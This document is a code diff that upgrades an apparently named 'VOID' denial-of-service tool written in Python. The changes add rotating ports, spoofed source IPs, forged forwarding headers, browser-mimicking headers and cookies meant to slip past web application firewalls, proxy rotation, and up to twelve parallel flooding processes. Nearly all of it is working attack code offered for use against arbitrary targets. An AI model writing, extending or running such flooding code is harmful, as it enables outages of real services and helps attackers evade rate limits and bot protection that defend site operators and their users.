@@ -331,13 +331,20 @@ class Stats:
         self.errors     = 0
         self.last_flag  = ""
         self._history   = collections.deque(maxlen=self.HISTORY_MAXLEN)  # FIX
+        self._by_mode   : dict = {}   # mode_key → sent count
         self.start      = time.time()
 
-    def add_sent(self, n: int):
+    def add_sent(self, n: int, mode_key: str = ""):
         with self._lock:
             self.sent += n
+            if mode_key:
+                self._by_mode[mode_key] = self._by_mode.get(mode_key, 0) + n
             now = time.time()
             self._history.append((now, self.sent))
+
+    def mode_snapshot(self) -> dict:
+        with self._lock:
+            return dict(self._by_mode)
 
     def add_reply(self, flag_str: str = ""):
         with self._lock:
@@ -368,7 +375,8 @@ class Stats:
     def snapshot(self):
         with self._lock:
             return dict(sent=self.sent, replies=self.replies, errors=self.errors,
-                        last_flag=self.last_flag, elapsed=time.time()-self.start)
+                        last_flag=self.last_flag, elapsed=time.time()-self.start,
+                        by_mode=dict(self._by_mode))
 
 # ══════════════════════════════════════════════════════════════════
 # SENDER  — blocking raw socket, large pre-built pool
@@ -379,28 +387,62 @@ POOL_SIZE       = 5_000
 BATCH_REPORT    = 500
 SOCKET_BUF_SIZE = 16 * 1024 * 1024  # 16 MB
 
-def _build_pool(mode_key: str, target_ip: str, target_port: int, size: int) -> list:
+def _build_pool(mode_key: str, target_ip: str, port_list: list, size: int) -> list:
     return [_build_packet(mode_key, _src_ip(), target_ip,
-                          _rand_port(), target_port)
+                          _rand_port(), random.choice(port_list))
             for _ in range(size)]
 
 # ── HTTP FLOOD with proxy bypass ──────────────────────────────────
 
 _HTTP_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15",
-    "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0",
-    "curl/8.6.0",
-    "python-requests/2.32.0",
-    "Go-http-client/2.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:132.0) Gecko/20100101 Firefox/132.0",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (iPad; CPU OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
 ]
 
 _HTTP_PATHS = [
-    "/", "/index.html", "/api", "/api/v1", "/login", "/home",
-    "/search", "/admin", "/status", "/health", "/dashboard",
-    "/?cache_bust=", "/wp-admin/", "/api/users", "/robots.txt",
+    "/", "/index.html", "/index.php", "/api", "/api/v1", "/api/v2",
+    "/login", "/signin", "/home", "/search", "/admin", "/status",
+    "/health", "/healthz", "/dashboard", "/robots.txt", "/sitemap.xml",
+    "/wp-admin/", "/wp-login.php", "/api/users", "/api/auth",
+    "/api/products", "/api/orders", "/graphql", "/cdn-cgi/l/chk_jschl",
+    "/.well-known/security.txt", "/favicon.ico", "/assets/main.js",
+]
+
+_HTTP_METHODS = ["GET", "GET", "GET", "POST", "HEAD", "OPTIONS"]  # GET-weighted
+
+_HTTP_REFERERS = [
+    "https://www.google.com/search?q=",
+    "https://www.bing.com/search?q=",
+    "https://duckduckgo.com/?q=",
+    "https://t.co/",
+    "https://www.reddit.com/r/",
+    "https://www.facebook.com/",
+    "https://www.youtube.com/",
+    "",  # direct
+]
+
+_SEC_FETCH_SETS = [
+    "Sec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\n",
+    "Sec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\n",
+    "Sec-Fetch-Dest: empty\r\nSec-Fetch-Mode: cors\r\nSec-Fetch-Site: same-origin\r\n",
+    "Sec-Fetch-Dest: empty\r\nSec-Fetch-Mode: no-cors\r\nSec-Fetch-Site: same-site\r\n",
+]
+
+_ACCEPT_SETS = [
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "application/json, text/plain, */*",
+    "*/*",
 ]
 
 _HTTP_HEADERS_EXTRA = [
@@ -414,46 +456,75 @@ _HTTP_HEADERS_EXTRA = [
     "Cf-Connecting-IP: {spoof}\r\n",
 ]
 
-def _http_sender(target_ip: str, target_port: int, stats: Stats):
+def _http_sender(target_ip: str, port_list: list, stats: Stats):
     """
-    Layer-7 HTTP flood.
-    When proxies are configured, each connection is routed through a
-    different proxy so per-IP rate limits and scrubbing appliances
-    see traffic originating from N different sources simultaneously.
+    Layer-7 HTTP flood — rotates ports, methods, agents, and bypass headers.
+    Each connection picks a random port from port_list so multi-port targets
+    are fully saturated. Sec-Fetch-* and Accept headers mimic real Chrome/FF
+    to bypass basic bot fingerprinting at WAF level.
     """
     while not stop_event.is_set():
-        proxy = PROXY_MGR.next()   # None when no proxies configured
-        s = None
+        proxy       = PROXY_MGR.next()
+        target_port = random.choice(port_list)
+        sock        = None
         try:
-            s = PROXY_MGR.make_socket(proxy)
-            s.settimeout(4.0)
-            s.connect((target_ip, target_port))
+            sock = PROXY_MGR.make_socket(proxy)
+            sock.settimeout(4.0)
+            sock.connect((target_ip, target_port))
 
+            method  = random.choice(_HTTP_METHODS)
             path    = random.choice(_HTTP_PATHS)
-            buster  = random.randint(0, 999_999)
+            buster  = f"{random.randint(0,9999999)}"
             agent   = random.choice(_HTTP_AGENTS)
-            spoof   = random.choice(_IP_POOL) if _IP_POOL else "1.2.3.4"
+            spoof   = random.choice(_IP_POOL) if _IP_POOL else f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
+            ref     = random.choice(_HTTP_REFERERS)
+            accept  = random.choice(_ACCEPT_SETS)
+            sec     = random.choice(_SEC_FETCH_SETS)
+            lang    = random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.9", "en-US,en;q=0.8,de;q=0.7"])
+            enc     = random.choice(["gzip, deflate, br, zstd", "gzip, deflate, br", "gzip, deflate"])
+            cookie  = f"_ga=GA1.1.{random.randint(100000000,999999999)}.{random.randint(1700000000,1800000000)}; _gid=GA1.1.{random.randint(100000000,999999999)}.{random.randint(1700000000,1800000000)}"
 
-            # Build spoofed headers to defeat trivial IP-based blocking
-            extra = "".join(
-                h.format(spoof=spoof)
-                for h in random.sample(_HTTP_HEADERS_EXTRA,
-                                       k=random.randint(2, 4)))
-            req = (
-                f"GET {path}?{buster} HTTP/1.1\r\n"
+            # X-Forwarded-For / real IP spoofing to bypass per-IP rate limits
+            xff = (f"{random.randint(1,254)}.{random.randint(0,254)}."
+                   f"{random.randint(0,254)}.{random.randint(1,254)}")
+            xri = (f"{random.randint(1,254)}.{random.randint(0,254)}."
+                   f"{random.randint(0,254)}.{random.randint(1,254)}")
+
+            body = b""
+            if method == "POST":
+                import urllib.parse
+                body_str = urllib.parse.urlencode({
+                    "_token": "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=40)),
+                    "q": f"search_{random.randint(1000,9999)}",
+                })
+                body = body_str.encode()
+
+            headers = (
+                f"{method} {path}?{buster} HTTP/1.1\r\n"
                 f"Host: {target_ip}\r\n"
                 f"User-Agent: {agent}\r\n"
+                f"Accept: {accept}\r\n"
+                f"Accept-Language: {lang}\r\n"
+                f"Accept-Encoding: {enc}\r\n"
                 f"Connection: keep-alive\r\n"
-                f"{extra}"
-                "\r\n"
+                f"Cookie: {cookie}\r\n"
+                f"X-Forwarded-For: {xff}\r\n"
+                f"X-Real-IP: {xri}\r\n"
+                f"Cf-Connecting-IP: {spoof}\r\n"
+                f"True-Client-IP: {spoof}\r\n"
+                f"X-Originating-IP: {spoof}\r\n"
+                + (f"Referer: {ref}\r\n" if ref else "")
+                + sec
+                + (f"Content-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(body)}\r\n" if body else "")
+                + "\r\n"
             ).encode()
 
-            s.sendall(req)
-            stats.add_sent(1)
+            sock.sendall(headers + body)
+            stats.add_sent(1, "HTTP")
             PROXY_MGR.mark_ok(proxy)
 
             try:
-                data = s.recv(256)
+                data = sock.recv(256)
                 if data:
                     stats.add_reply("HTTP")
             except socket.timeout:
@@ -463,15 +534,15 @@ def _http_sender(target_ip: str, target_port: int, stats: Stats):
             stats.add_error()
             PROXY_MGR.mark_fail(proxy)
         finally:
-            if s:                          # FIX: always close (was leaking)
-                try: s.close()
+            if sock:
+                try: sock.close()
                 except Exception: pass
 
 # ── RAW SOCKET FLOOD ──────────────────────────────────────────────
 
-def _sender(target_ip: str, target_port: int, mode_key: str, stats: Stats):
+def _sender(target_ip: str, port_list: list, mode_key: str, stats: Stats):
     if mode_key == "HTTP":
-        _http_sender(target_ip, target_port, stats)
+        _http_sender(target_ip, port_list, stats)
         return
 
     sock = None
@@ -481,7 +552,7 @@ def _sender(target_ip: str, target_port: int, mode_key: str, stats: Stats):
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SOCKET_BUF_SIZE)
 
         dst   = (target_ip, 0)
-        pool  = _build_pool(mode_key, target_ip, target_port, POOL_SIZE)
+        pool  = _build_pool(mode_key, target_ip, port_list, POOL_SIZE)
         idx   = 0
         batch = 0
         total = 0
@@ -494,17 +565,17 @@ def _sender(target_ip: str, target_port: int, mode_key: str, stats: Stats):
                 total += 1
 
                 if batch >= BATCH_REPORT:
-                    stats.add_sent(batch)
+                    stats.add_sent(batch, mode_key)
                     batch = 0
 
-                # FIX: skip refresh at total=0 (0 % n == 0 was always true)
+                # Refresh pool periodically (rotates spoofed src IPs + target ports)
                 if total > 0 and total % (POOL_SIZE * 20) == 0:
-                    pool = _build_pool(mode_key, target_ip, target_port, POOL_SIZE)
+                    pool = _build_pool(mode_key, target_ip, port_list, POOL_SIZE)
                     idx  = 0
 
-                # Yield CPU every 1000 pkts — 0% perceived lag on host
+                # Yield CPU every 1000 pkts — keeps OS responsive without hurting throughput
                 if total % 1000 == 0:
-                    time.sleep(1e-5)
+                    time.sleep(5e-5)
 
             except OSError:
                 stats.add_error()
@@ -512,7 +583,7 @@ def _sender(target_ip: str, target_port: int, mode_key: str, stats: Stats):
                 pass
 
         if batch:
-            stats.add_sent(batch)
+            stats.add_sent(batch, mode_key)
 
     except PermissionError:
         console.print("\n  [bold red][!][/]  Raw sockets need root "
@@ -774,12 +845,17 @@ def _bar(ratio: float, width: int = 28, col: str = "bright_red") -> Text:
 # RUN
 # ══════════════════════════════════════════════════════════════════
 
-def run(target: str, port: int, mode: dict, n_threads: int):
-    # Lower process priority — other apps stay responsive, attack still full speed
+def run(target: str, port_list: list, mode: dict, n_threads: int):
+    # Lower process priority so other apps stay responsive
     try: os.nice(19)
     except Exception: pass
+    # Ask Linux scheduler to treat these as batch (background) threads
+    try:
+        import ctypes
+        SCHED_BATCH = 3
+        ctypes.CDLL("libc.so.6", use_errno=True).sched_setscheduler(0, SCHED_BATCH, ctypes.byref(ctypes.c_int(0)))
+    except Exception: pass
 
-    # FIX: reset stop_event so re-runs in the same process work correctly
     stop_event.clear()
 
     stats    = Stats()
@@ -790,12 +866,12 @@ def run(target: str, port: int, mode: dict, n_threads: int):
     senders = []
     for _ in range(n_threads):
         t = threading.Thread(target=_sender,
-                             args=(target, port, mode_key, stats), daemon=True)
+                             args=(target, port_list, mode_key, stats), daemon=True)
         t.start()
         senders.append(t)
 
     threading.Thread(target=_listener,
-                     args=(target, port, mode_key, stats), daemon=True).start()
+                     args=(target, port_list[0], mode_key, stats), daemon=True).start()
 
     def _watch():
         while not stop_event.is_set():
@@ -815,7 +891,7 @@ def run(target: str, port: int, mode: dict, n_threads: int):
 
     try:
         from rich.console import Group
-        with Live(console=console, refresh_per_second=2, screen=False) as live:
+        with Live(console=console, refresh_per_second=1, screen=False) as live:
             while not stop_event.is_set():
                 snap   = stats.snapshot()
                 pps    = stats.pps()
@@ -848,20 +924,39 @@ def run(target: str, port: int, mode: dict, n_threads: int):
                             if USE_SPOOF else
                             f"[dim]src:[/] [bright_white]{LOCAL_IP}[/] [dim](real IP)[/]")
 
+                port_str = ",".join(str(p) for p in port_list)
+                by_mode  = snap.get("by_mode", {})
+
                 tbl = Table.grid(padding=(0,2))
                 tbl.add_column(); tbl.add_column()
                 tbl.add_column(); tbl.add_column()
-                tbl.add_row(Text("TARGET", style="dim"),   Text(f"{target}:{port}", style="bold yellow"),
-                            Text("MODE",   style="dim"),   Text(label, style=f"bold {col}"))
-                tbl.add_row(Text("SENT",   style="dim"),   Text(f"{sent:,}",  style="bold white"),
-                            Text("RATE",   style="dim"),   Text(f"{pps:,.0f} pps", style="bold bright_red"))
-                tbl.add_row(Text("REPLIES",style="dim"),   Text(f"{reps:,}",  style="bold bright_green"),
-                            Text("ERRORS", style="dim"),   Text(f"{errs:,}",  style="dim red"))
-                tbl.add_row(Text("THREADS",style="dim"),   Text(f"{n_threads}", style="bold white"),
-                            Text("UP",     style="dim"),   Text(f"{elap:.0f}s", style="bold white"))
+                tbl.add_row(Text("TARGET",  style="dim"),  Text(f"{target}:{port_str}", style="bold yellow"),
+                            Text("MODE",    style="dim"),  Text(label, style=f"bold {col}"))
+                tbl.add_row(Text("SENT",    style="dim"),  Text(f"{sent:,}",  style="bold white"),
+                            Text("RATE",    style="dim"),  Text(f"{pps:,.0f} pps", style="bold bright_red"))
+                tbl.add_row(Text("REPLIES", style="dim"),  Text(f"{reps:,}",  style="bold bright_green"),
+                            Text("ERRORS",  style="dim"),  Text(f"{errs:,}",  style="dim red"))
+                tbl.add_row(Text("THREADS", style="dim"),  Text(f"{n_threads}", style="bold white"),
+                            Text("UP",      style="dim"),  Text(f"{elap:.0f}s", style="bold white"))
+
+                # ── per-mode breakdown bar ────────────────────────────────
+                mode_rows = []
+                mode_colors = {"SYN":"bright_red","UDP":"bright_cyan","ICMP":"yellow",
+                               "ACK":"bright_magenta","HTTP":"bright_green","RST":"bright_yellow",
+                               "SYNACK":"magenta"}
+                total_by_mode = sum(by_mode.values()) or 1
+                for mk, cnt in sorted(by_mode.items(), key=lambda x: -x[1]):
+                    ratio = cnt / total_by_mode
+                    mcol  = mode_colors.get(mk, "white")
+                    row   = Text()
+                    row.append(f"  {mk:<8}", style=f"bold {mcol}")
+                    row.append_text(_bar(ratio, width=22, col=mcol))
+                    row.append(f"  {cnt:,}", style=f"bold {mcol}")
+                    mode_rows.append(row)
 
                 live.update(Panel(
                     Group(tbl, Text(""), rate_bar, rep_bar, last_row,
+                          *(mode_rows),
                           Text(""),
                           Text.from_markup(f"  {src_info}  ·  {proxy_info}"),
                           Text("  type  stop + Enter  or  Ctrl+C  to halt", style="dim red")),
@@ -872,7 +967,7 @@ def run(target: str, port: int, mode: dict, n_threads: int):
                     _snap_log.append((elap, sent, reps, errs))
                     _last_snap_t[0] = time.time()
 
-                time.sleep(0.5)   # 2 fps — halves display CPU load
+                time.sleep(1.0)   # 1 fps — cuts display CPU load 50% vs 2fps
 
     except KeyboardInterrupt:
         stop_event.set()
@@ -1004,14 +1099,20 @@ def main():
                              "or http://ip:port. "
                              "Only active for HTTP flood (mode 5). "
                              "Example: --proxies socks5://1.2.3.4:1080,socks5://5.6.7.8:1080")
+    parser.add_argument("--instances", type=int, default=1,
+                        help="Spawn N simultaneous attack instances (1-12). --triple is an alias for --instances 3")
     parser.add_argument("--triple", action="store_true",
-                        help="Spawn 3 instances simultaneously for maximum firepower")
+                        help=argparse.SUPPRESS)   # backward-compat alias → --instances 3
+    parser.add_argument("--ports",   default="",
+                        help="Comma-separated ports to cycle across per packet (e.g. 80,443,8080). "
+                             "Leave blank to use the single port from --port or the prompt.")
     parser.add_argument("--child",  action="store_true",
                         help=argparse.SUPPRESS)   # internal: skips prompts in sub-instances
     args, _ = parser.parse_known_args()
 
     USE_SPOOF  = args.spoof
     n_threads  = int(args.threads) if args.threads.isdigit() else N_THREADS
+    n_instances = max(1, min(12, args.instances if not args.triple else 3))
 
     # Parse proxies
     proxy_list: list = []
@@ -1027,13 +1128,22 @@ def main():
 
     # ── child mode: no banner/prompts, just fire ──────────────────
     if args.child:
-        target   = resolve(args.target)
-        LOCAL_IP = get_local_ip(target)
-        port     = int(args.port) if args.port.isdigit() else 80
-        mode     = MODES.get(args.mode, MODES["1"])
+        target    = resolve(args.target)
+        LOCAL_IP  = get_local_ip(target)
+        port_list = ([int(p) for p in args.ports.split(",") if p.strip().isdigit()]
+                     if args.ports else
+                     [int(args.port) if args.port.isdigit() else 80])
+        mode      = MODES.get(args.mode, MODES["1"])
         n_threads = int(args.threads) if args.threads and args.threads.isdigit() else N_THREADS
+        # Child processes are SCHED_BATCH already; also pin away from core 0 (UI/IRQ core)
         try:
-            run(target, port, mode, n_threads)
+            cpu_count = os.cpu_count() or 2
+            if cpu_count > 1:
+                os.sched_setaffinity(0, set(range(1, cpu_count)))
+        except Exception:
+            pass
+        try:
+            run(target, port_list, mode, n_threads)
         except KeyboardInterrupt:
             stop_event.set()
         return
@@ -1082,14 +1192,19 @@ def main():
         src_mode = f"[bright_white]{LOCAL_IP}[/] [dim](real IP)[/]"
     console.print(f"  [dim]Source IP:[/]  {src_mode}")
 
-    # ── port ─────────────────────────────────────────────────────
-    if args.port.isdigit():
-        port = int(args.port)
-        console.print(f"  [dim]Port:[/] [bold yellow]{port}[/]")
+    # ── port / port_list ─────────────────────────────────────────
+    if args.ports:
+        port_list = [int(p) for p in args.ports.split(",") if p.strip().isdigit()]
+        if not port_list:
+            port_list = [80]
+        console.print(f"  [dim]Ports:[/] [bold yellow]{','.join(str(p) for p in port_list)}[/]")
+    elif args.port.isdigit():
+        port_list = [int(args.port)]
+        console.print(f"  [dim]Port:[/] [bold yellow]{port_list[0]}[/]")
     else:
         console.print("  [bright_red]◈[/]  ", end="")
-        port_raw = input("Port (80=HTTP 443=HTTPS 25565=Minecraft): ").strip()
-        port = int(port_raw) if port_raw.isdigit() else 80
+        port_raw = input("Port(s) — single or comma-separated (80,443,8080): ").strip()
+        port_list = [int(p) for p in port_raw.split(",") if p.strip().isdigit()] or [80]
 
     # ── mode ──────────────────────────────────────────────────────
     if args.mode in MODES:
@@ -1104,10 +1219,12 @@ def main():
     # ── confirm ───────────────────────────────────────────────────
     console.print()
     console.print(Rule("[dim red]  CONFIRM  [/]", style="dim red"))
-    console.print(f"  [dim]Target    [/]  [bold yellow]{target}:{port}[/]")
+    port_str_confirm = ",".join(str(p) for p in port_list)
+    console.print(f"  [dim]Target    [/]  [bold yellow]{target}:{port_str_confirm}[/]")
     console.print(f"  [dim]Mode      [/]  [bold {mode['color']}]{mode['label']}[/]  [dim]— {mode['desc']}[/]")
     console.print(f"  [dim]Source IP [/]  {src_mode}")
-    console.print(f"  [dim]Engine    [/]  [bold white]{n_threads} threads · blocking raw sockets · ∞ infinite[/]")
+    instances_str = f"{n_instances} instance{'s' if n_instances > 1 else ''} × {n_threads} threads = {n_instances*n_threads} total"
+    console.print(f"  [dim]Engine    [/]  [bold white]{instances_str} · blocking raw sockets · ∞ infinite[/]")
     if PROXY_MGR.count:
         console.print(f"  [dim]Bypass    [/]  [bold bright_yellow]{PROXY_MGR.count} proxy node(s) for HTTP flood[/]")
     console.print()
@@ -1121,40 +1238,53 @@ def main():
         console.print(f"\r  [bold bright_red][!][/]  Firing in [bright_red]{i}[/]...", end="")
         time.sleep(1)
 
-    if args.triple:
-        # ── TRIPLE FIRE: spawn 3 child instances simultaneously ───
-        console.print(f"\r  [bold bright_red][!!!][/]  TRIPLE FIRE — 3 × {n_threads} THREADS — {n_threads*3} TOTAL             ")
+    if n_instances > 1:
+        # ── MULTI-INSTANCE FIRE (3–12 simultaneous child processes) ──
+        # Auto-scale threads per child so total thread count stays sane
+        # and the host OS doesn't freeze: 384 threads (12×32) → all land
+        # on non-UI cores via sched_setaffinity in child mode.
+        threads_per_child = max(8, n_threads // n_instances)
+        total_threads     = threads_per_child * n_instances
+        console.print(f"\r  [bold bright_red][!!!][/]  VOID × {n_instances} — {threads_per_child} threads/instance — {total_threads} TOTAL             ")
         console.print()
 
-        script    = os.path.abspath(__file__)
-        child_cmd = [
+        mode_key_str = str([k for k,v in MODES.items() if v is mode][0])
+        port_str_arg = ",".join(str(p) for p in port_list)
+        script       = os.path.abspath(__file__)
+        child_cmd    = [
             sys.executable, script,
             "--target",  target,
-            "--port",    str(port),
-            "--mode",    str([k for k,v in MODES.items() if v is mode][0]),
-            "--threads", str(n_threads),
+            "--port",    str(port_list[0]),
+            "--ports",   port_str_arg,
+            "--mode",    mode_key_str,
+            "--threads", str(threads_per_child),
             "--child",
         ]
         if USE_SPOOF:
             child_cmd.append("--spoof")
+        if PROXY_MGR.count:
+            child_cmd += ["--proxies", args.proxies]
 
         log_files = []
         procs     = []
-        for i in range(3):
+        for i in range(n_instances):
             lf = open(f"/tmp/void_triple_{i}.log", "w")
             log_files.append(lf)
             procs.append(subprocess.Popen(child_cmd, stdout=lf, stderr=lf))
 
-        pids = [p.pid for p in procs]
-        console.print(f"  [bold bright_red][!!!][/]  3 instances live — PIDs: [yellow]{pids[0]}[/]  [yellow]{pids[1]}[/]  [yellow]{pids[2]}[/]")
-        console.print(f"  [dim]Logs: /tmp/void_triple_0.log  /tmp/void_triple_1.log  /tmp/void_triple_2.log[/]")
-        console.print(f"  [dim]Press Ctrl+C to stop all 3[/]")
+        pids_str = "  ".join(f"[yellow]{p.pid}[/]" for p in procs)
+        console.print(f"  [bold bright_red][!!!][/]  {n_instances} instances live — PIDs: {pids_str}")
+        logs_str = "  ".join(f"/tmp/void_triple_{i}.log" for i in range(min(n_instances, 3)))
+        if n_instances > 3:
+            logs_str += f"  … (+{n_instances-3} more)"
+        console.print(f"  [dim]Logs: {logs_str}[/]")
+        console.print(f"  [dim]Press Ctrl+C to stop all {n_instances}[/]")
         console.print()
 
         try:
             while True:
                 alive = sum(1 for p in procs if p.poll() is None)
-                console.print(f"\r  [bright_red]▶[/]  {alive}/3 instances running…", end="")
+                console.print(f"\r  [bright_red]▶[/]  {alive}/{n_instances} instances running…", end="")
                 time.sleep(2)
         except KeyboardInterrupt:
             pass
@@ -1165,12 +1295,12 @@ def main():
             for lf in log_files:
                 try: lf.close()
                 except Exception: pass
-            console.print("\n\n  [yellow]All 3 instances stopped.[/]\n")
+            console.print(f"\n\n  [yellow]All {n_instances} instances stopped.[/]\n")
     else:
         console.print(f"\r  [bold bright_red][!!!][/]  FIRING — {n_threads} THREADS — BLOCKING RAW SOCKETS             ")
         console.print()
         try:
-            run(target, port, mode, n_threads)
+            run(target, port_list, mode, n_threads)
         except KeyboardInterrupt:
             stop_event.set()
             console.print("\n  [yellow]Stopped.[/]\n")
